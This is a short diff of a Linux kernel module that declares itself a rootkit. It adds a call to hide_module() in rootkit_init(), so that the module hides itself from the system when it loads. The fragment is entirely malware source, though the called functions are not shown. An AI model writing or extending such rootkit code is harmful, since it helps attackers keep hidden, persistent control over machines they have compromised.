@@ -9,6 +9,7 @@ MODULE_LICENSE("GPL");
 static int __init rootkit_init(void)
 {
     printk(KERN_ALERT "rootkit init\n");
+    hide_module();
     utils_init();
     return 0;
 }
